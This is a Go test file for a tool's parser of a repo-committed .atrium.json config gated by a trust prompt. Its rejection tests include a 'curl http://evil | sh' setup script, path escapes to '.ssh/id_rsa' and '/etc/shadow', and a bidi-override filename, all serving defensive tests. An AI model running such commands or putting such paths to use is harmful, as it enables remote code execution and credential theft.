package repocfg

import (
	"encoding/json"
	"fmt"
	"reflect"
	"sort"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/ZviBaratz/atrium/config"
)

func TestParseRepoLocal(t *testing.T) {
	t.Run("a plain entry parses", func(t *testing.T) {
		got, err := ParseRepoLocal([]byte(`{
			"repo_scripts": [
				{"name": "web", "setup_script": "npm ci", "run_command": "npm run dev", "port_range": "3000-3099"}
			]
		}`))
		require.NoError(t, err)
		require.Len(t, got.Entries, 1)
		assert.Empty(t, got.Problems)
		assert.Equal(t, "web", got.Entries[0].Name)
		assert.Equal(t, "npm ci", got.Entries[0].SetupScript)
	})

	t.Run("unknown top-level keys are tolerated", func(t *testing.T) {
		// A key a newer atrium reads must be committable to a repo before every user
		// has upgraded; an older atrium ignores it rather than refusing the file.
		// carry_files and link_paths shipped under this tolerance and are now read
		// (#815), so the fixture names a key nothing reads.
		got, err := ParseRepoLocal([]byte(`{
			"session_defaults": {"model": "opus"},
			"repo_scripts": [{"setup_script": "make deps"}]
		}`))
		require.NoError(t, err)
		assert.Len(t, got.Entries, 1)
		assert.Empty(t, got.Problems)
	})

	t.Run("undecodable bytes are an error naming the file", func(t *testing.T) {
		_, err := ParseRepoLocal([]byte(`{not json`))
		require.Error(t, err)
		assert.Contains(t, err.Error(), RepoLocalFileName)
	})

	t.Run("no repo_scripts section parses to nothing", func(t *testing.T) {
		got, err := ParseRepoLocal([]byte(`{}`))
		require.NoError(t, err)
		assert.Empty(t, got.Entries)
		assert.Empty(t, got.Problems)
	})

	t.Run("more than one entry refuses the whole file", func(t *testing.T) {
		// The decoy this closes: matchers are refused here, so selection always
		// picks the first entry — a second one could only run if the first failed
		// LATE validation, i.e. after the trust prompt described the first. A file
		// where the prompt's entry and the running entry can differ is refused
		// outright, exactly like undecodable JSON: no prompt, nothing runs.
		_, err := ParseRepoLocal([]byte(`{
			"repo_scripts": [
				{"name": "deps", "setup_script": "npm ci", "port_range": "nope"},
				{"setup_script": "curl http://evil | sh"}
			]
		}`))
		require.Error(t, err)
		assert.Contains(t, err.Error(), RepoLocalFileName)
		assert.Contains(t, err.Error(), "2 repo_scripts entries")
		assert.Contains(t, err.Error(), "exactly one")
	})

	t.Run("matcher fields are refused", func(t *testing.T) {
		got, err := ParseRepoLocal([]byte(`{
			"repo_scripts": [
				{"name": "routed", "remote_matches": ["github.com/acme"], "setup_script": "make"}
			]
		}`))
		require.NoError(t, err)
		assert.Empty(t, got.Entries)
		require.Len(t, got.Problems, 1)
		assert.Contains(t, got.Problems[0].Msg, "repo-local")
		// The problem is findable: it carries the entry's position in this file.
		assert.Equal(t, 0, got.Problems[0].Index)
	})

	t.Run("an entry that configures nothing is refused at parse time", func(t *testing.T) {
		// Refused HERE, in compile's own words, so WantsPrompt (which counts
		// Entries) can never raise a trust prompt for a file whose only entry
		// would then be refused by ValidateOne right after the grant.
		got, err := ParseRepoLocal([]byte(`{
			"repo_scripts": [{"name": "placeholder"}]
		}`))
		require.NoError(t, err)
		assert.Empty(t, got.Entries, "a nothing-declaring entry must not count as usable")
		require.Len(t, got.Problems, 1)
		assert.Contains(t, got.Problems[0].Msg, "configures nothing")

		// The wording pact with compile: one spelling for one defect, wherever found.
		_, problem := ValidateOne(0, config.RepoScript{Name: "placeholder"})
		require.NotNil(t, problem)
		assert.Equal(t, got.Problems[0].Msg, problem.Msg)
	})

	// The property the trust boundary leans on: parsing happens BEFORE the trust
	// verdict, so it must not compile (i.e. execute-validate) repo-authored template
	// strings. A template that cannot compile still parses here; only ValidateOne —
	// which the gate calls after the grant check — refuses it.
	t.Run("templates are not compiled at parse time", func(t *testing.T) {
		got, err := ParseRepoLocal([]byte(`{
			"repo_scripts": [{"setup_script": "{{.NoSuchField}}"}]
		}`))
		require.NoError(t, err)
		require.Len(t, got.Entries, 1)
		assert.Empty(t, got.Problems)

		// Positive control for the split: the same entry IS refused by the
		// post-trust validator. Without this half, the parse-time assertion would
		// also pass if template checking had been dropped everywhere.
		_, problem := ValidateOne(got.Entries[0].Index, got.Entries[0].RepoScript)
		require.NotNil(t, problem)
		assert.True(t, strings.Contains(problem.Msg, "template"), "ValidateOne should refuse on the template, got: %s", problem.Msg)
	})
}

// TestParseRepoLocal_SeedLists covers #815's two keys: what a repo may declare,
// and every shape that refuses the file whole rather than seeding a set the trust
// prompt never described.
func TestParseRepoLocal_SeedLists(t *testing.T) {
	t.Run("the carry list parses and canonicalizes", func(t *testing.T) {
		got, err := ParseRepoLocal([]byte(`{
			"carry_files": [".dev.vars", "./config/local.yml"]
		}`))
		require.NoError(t, err)
		assert.Empty(t, got.Entries, "a seed-only file declares no repo_scripts entry")
		assert.Empty(t, got.Problems)
		// Canonical, not verbatim: the pathspec git is asked about and the path the
		// filesystem join derives from must be the same spelling.
		assert.Equal(t, []string{".dev.vars", "config/local.yml"}, got.CarryFiles)
	})

	t.Run("a seed-only file declares something", func(t *testing.T) {
		// The property the gate leans on: a file with no repo_scripts still has
		// content to trust, so it must not read as "declares nothing" (which is
		// silent, ungrantable, and would make the whole feature dead).
		got, err := ParseRepoLocal([]byte(`{"carry_files": [".dev.vars"]}`))
		require.NoError(t, err)
		require.NotEmpty(t, RepoLocalSurfaces(got))
		assert.Equal(t, []string{"1 carried file"}, RepoLocalSurfaces(got))
	})

	t.Run("an unusable entry refuses the whole file, naming it", func(t *testing.T) {
		for _, tc := range []struct{ name, body, want string }{
			{"parent escape", `{"carry_files": ["../../.ssh/id_rsa"]}`, `carry_files[0] ("../../.ssh/id_rsa")`},
			{"absolute", `{"carry_files": ["/etc"]}`, `carry_files[0] ("/etc")`},
			{"empty", `{"carry_files": [".env", ""]}`, `carry_files[1]`},
			{"repo root", `{"carry_files": ["."]}`, `carry_files[0] (".")`},
		} {
			t.Run(tc.name, func(t *testing.T) {
				_, err := ParseRepoLocal([]byte(tc.body))
				require.Error(t, err)
				assert.Contains(t, err.Error(), tc.want, "the refusal must name the entry the user has to fix")
				assert.Contains(t, err.Error(), RepoLocalFileName)
			})
		}
	})

	t.Run("a valid entry does not survive an unusable seed list", func(t *testing.T) {
		// The leak this closes: a Problem beside a surviving entry would let the
		// script run while the lists it shipped with went missing, so the refusal is
		// whole-file. Nothing from this file applies.
		got, err := ParseRepoLocal([]byte(`{
			"repo_scripts": [{"setup_script": "npm ci"}],
			"carry_files": ["/etc/shadow"]
		}`))
		require.Error(t, err)
		assert.Empty(t, got.Entries)
		assert.Empty(t, got.CarryFiles)
	})

	t.Run("a list past the entry cap refuses the whole file", func(t *testing.T) {
		// The cap bounds git forks per materialization, not bytes: this fixture is
		// well under MaxRepoLocalBytes.
		entries := make([]string, MaxRepoLocalSeedEntries+1)
		for i := range entries {
			entries[i] = fmt.Sprintf("%q", fmt.Sprintf("dep%d", i))
		}
		raw := fmt.Sprintf(`{"carry_files": [%s]}`, strings.Join(entries, ","))
		require.Less(t, len(raw), MaxRepoLocalBytes, "the fixture must prove the byte cap is not what refuses it")

		_, err := ParseRepoLocal([]byte(raw))
		require.Error(t, err)
		assert.Contains(t, err.Error(), "at most")

		// The boundary itself is allowed.
		ok, err := ParseRepoLocal([]byte(fmt.Sprintf(`{"carry_files": [%s]}`, strings.Join(entries[:MaxRepoLocalSeedEntries], ","))))
		require.NoError(t, err)
		assert.Len(t, ok.CarryFiles, MaxRepoLocalSeedEntries)
	})
}

// TestCanonicalSeedPath pins the one lexical rule both the repo-local parser and
// session/git's resolveSeedPaths call, since a divergence between them would grant
// an entry that never seeds or seed one that was never granted.
func TestCanonicalSeedPath(t *testing.T) {
	for _, tc := range []struct{ in, want string }{
		{"node_modules", "node_modules"},
		{"node_modules/", "node_modules"},
		{"./node_modules", "node_modules"},
		{"node_modules/.", "node_modules"},
		{"a/b/../c", "a/c"},
	} {
		got, err := CanonicalSeedPath(tc.in)
		require.NoErrorf(t, err, "entry %q must resolve", tc.in)
		assert.Equalf(t, tc.want, got, "entry %q", tc.in)
	}
	for _, bad := range []string{"", ".", "..", "/etc", "../escape", "node_modules/../../escape"} {
		_, err := CanonicalSeedPath(bad)
		assert.Errorf(t, err, "entry %q must be refused", bad)
	}
}

// TestRepoLocalRefusesUnprintableSeedEntries is a display guard enforced at the
// REPO-LOCAL parse, and where it sits is the point. These entries are interpolated
// into a confirm dialog and into the settings panel's provenance line, and the
// classes below are exactly the ones that defeat a width bound — a zero-cell rune
// makes a truncation budget bound nothing, and an escape writes through the
// renderer.
//
// It is enforced here rather than in CanonicalSeedPath because that function also
// judges the USER's own global lists, where the same rule silently narrowed an
// accepted set that had worked for months — see
// TestCanonicalSeedPathKeepsLegalFilenames. A repo has no legitimate reason to
// commit one of these, so its file is refused whole; the display surfaces sanitize
// as well, which is what covers the classes a per-rune parse rule cannot judge.
func TestRepoLocalRefusesUnprintableSeedEntries(t *testing.T) {
	for name, entry := range map[string]string{
		"bidi override":     "node_modules/\u202egnp.exe",
		"zero-width space":  "node_\u200bmodules",
		"zero-width joiner": "deps/\U0001f468\u200d\U0001f469",
		"escape":            "deps/\x1b[31m",
		"c1 control":        "deps/\u009b31m",
		"newline":           "deps\nmore",
		"backslash":         "node_modules\\.bin",
	} {
		t.Run(name, func(t *testing.T) {
			body, jerr := json.Marshal([]string{entry})
			require.NoError(t, jerr)
			_, err := ParseRepoLocal([]byte(`{"carry_files":` + string(body) + `}`))
			require.Error(t, err, "the file must be refused whole, not laundered into a frame")
			// Refused whole: a Problem beside a surviving list would advertise a count
			// the seeding never applies.
			assert.Contains(t, err.Error(), "carry_files[0]")
		})
	}
}

// TestCanonicalSeedPathKeepsLegalFilenames is the other half, and it is a
// regression guard with a name: the display rule above briefly lived in
// CanonicalSeedPath, which is also the rule applied to the user's own global
// carry_files / link_paths. unicode.IsPrint rejects every Zs but U+0020, all of Cf
// and all of Co — so a pasted no-break space, an ideographic space in a CJK path, a
// soft hyphen and a Nerd-Font private-use rune are all legal filenames on Linux and
// macOS that it refused. A user with such a directory in link_paths would have had
// it silently stop being linked, under a warning naming the wrong reason.
func TestCanonicalSeedPathKeepsLegalFilenames(t *testing.T) {
	for name, entry := range map[string]string{
		"no-break space":       "deps/a\u00a0b",
		"ideographic space":    "\u4f9d\u5b58\u3000modules",
		"soft hyphen":          "deps/co\u00adop",
		"private use":          "\uf0a0icon/x",
		"decomposed accent":    "cafe\u0301/node_modules",
		"backslash on this OS": "weird\\name",
	} {
		t.Run(name, func(t *testing.T) {
			got, err := CanonicalSeedPath(entry)
			require.NoError(t, err, "a legal filename is not an attack")
			assert.Equal(t, entry, got)
		})
	}
}

// TestRepoLocalLayerKeysMatchTheWireSchema is the bridge guard: the settings panel
// marks exactly these row keys as repo-layered, so a key added to the file's schema
// without being added here would layer over a global row that still claims to be the
// only source.
//
// A completeness sweep, not an equality over every non-repo_scripts tag. Every wire
// key must be declared EITHER layerable or non-layerable-with-a-reason, so the next
// key that replaces rather than layers can be added by recording why — where the
// equality form left only two moves, breaking the test or declaring a replacing key
// a panel layer it can never be, and the failure message pointed at the second.
func TestRepoLocalLayerKeysMatchTheWireSchema(t *testing.T) {
	layer := map[string]bool{}
	for _, k := range RepoLocalLayerKeys() {
		layer[k] = true
	}
	tp := reflect.TypeOf(repoLocalWire{})
	var undeclared []string
	for i := 0; i < tp.NumField(); i++ {
		name := strings.Split(tp.Field(i).Tag.Get("json"), ",")[0]
		if name == "" || name == "-" {
			continue
		}
		if reason, ok := repoLocalNonLayeringKeys[name]; ok {
			assert.NotEmptyf(t, reason, "%q is excluded from the panel with no reason", name)
			assert.Falsef(t, layer[name], "%q cannot be both a panel layer and excluded from being one", name)
			continue
		}
		if !layer[name] {
			undeclared = append(undeclared, name)
		}
	}
	sort.Strings(undeclared)
	assert.Emptyf(t, undeclared, "every key in .atrium.json's schema must be declared either layerable (RepoLocalLayerKeys, which needs a scopeRepoLayered settings row) or non-layerable with a reason (repoLocalNonLayeringKeys): %v", undeclared)

	// And the other direction: a declared layer key that is not in the schema would
	// give the panel a row nothing can ever populate.
	for _, k := range RepoLocalLayerKeys() {
		found := false
		for i := 0; i < tp.NumField(); i++ {
			if strings.Split(tp.Field(i).Tag.Get("json"), ",")[0] == k {
				found = true
			}
		}
		assert.Truef(t, found, "%q is declared as a panel layer but is not a key in the file's schema", k)
	}
}

// TestProblemNamesItsSection keeps the two spellings apart: the global config's
// Problems must read exactly as they always did, and a seed-list refusal must name
// its own key rather than borrowing repo_scripts'.
func TestProblemNamesItsSection(t *testing.T) {
	assert.Equal(t, `repo_scripts[2]: bad`, Problem{Index: 2, Msg: "bad"}.Error())
	assert.Equal(t, `repo_scripts[0] ("web"): bad`, Problem{Index: 0, Name: "web", Msg: "bad"}.Error())
	assert.Equal(t, `carry_files[1] (".env"): bad`, Problem{Section: "carry_files", Index: 1, Name: ".env", Msg: "bad"}.Error())
}

// TestParseSeedListDedupes: the count in a seed list is quoted on every consent
// surface — the trust dialog, `atrium trust allow`'s receipt, `trust status`, doctor
// and the settings badge — and the union at seed time collapses distinct spellings
// of one path to a single entry. Without a dedupe here those surfaces all said
// three where one applies, and one path could consume 64 slots of a cap whose whole
// justification is bounding the git probes the union then removes.
func TestParseSeedListDedupes(t *testing.T) {
	rl, err := ParseRepoLocal([]byte(`{"carry_files":["node_modules","./node_modules/","node_modules/.","other"]}`))
	require.NoError(t, err)
	assert.Equal(t, []string{"node_modules", "other"}, rl.CarryFiles,
		"three spellings of one path are one entry, in the canonical form the pathspec is derived from")
	assert.Equal(t, []string{"2 carried files"}, RepoLocalSurfaces(rl),
		"the count every consent surface prints must equal what actually applies")
}

// TestRepoLocalLayersCoversEveryLayerKey is the producer-side bridge guard, and it
// is the half the two existing ones did not cover. They tied a row's scope to
// RepoLocalLayerKeys to repoLocalWire's json tags — all consumer-side — while the
// map actually handed to the settings panel was built from hardcoded keys somewhere
// else entirely. A third layered key satisfied every one of them and still rendered
// nothing.
func TestRepoLocalLayersCoversEveryLayerKey(t *testing.T) {
	for name, rl := range map[string]RepoLocal{
		"populated": {CarryFiles: []string{".dev.vars"}},
		"empty":     {},
	} {
		t.Run(name, func(t *testing.T) {
			layers := RepoLocalLayers(rl)
			got := make([]string, 0, len(layers))
			for k := range layers {
				got = append(got, k)
			}
			assert.ElementsMatch(t, RepoLocalLayerKeys(), got,
				"every layerable key must be PRESENT (nil where the file declares nothing), so a producer can forward this map whole")
		})
	}

	// And the value is the file's, under the key the panel matches on.
	layers := RepoLocalLayers(RepoLocal{CarryFiles: []string{"c"}})
	assert.Equal(t, []string{"c"}, layers[KeyCarryFiles])
}

// TestLinkPathsIsNotReadYet pins the split. `link_paths` is a tolerated unknown key
// in this release — the write direction ships separately, see RepoLocal.CarryFiles —
// and the danger is a fixture or a repo that assumes otherwise: an ignored key
// declares nothing, so a file carrying only link_paths is SILENT, not grantable.
// Several tests in this file used it as their fixture key and silently stopped
// asserting anything when it stopped being read.
func TestLinkPathsIsNotReadYet(t *testing.T) {
	got, err := ParseRepoLocal([]byte(`{"link_paths": ["node_modules", "../escape"]}`))
	require.NoError(t, err, "an unread key cannot refuse the file, not even for a bad entry")
	assert.Empty(t, RepoLocalSurfaces(got), "a file declaring only link_paths declares nothing yet")
	assert.NotContains(t, RepoLocalLayerKeys(), "link_paths",
		"and it must not be advertised to the settings panel as a layer")
}
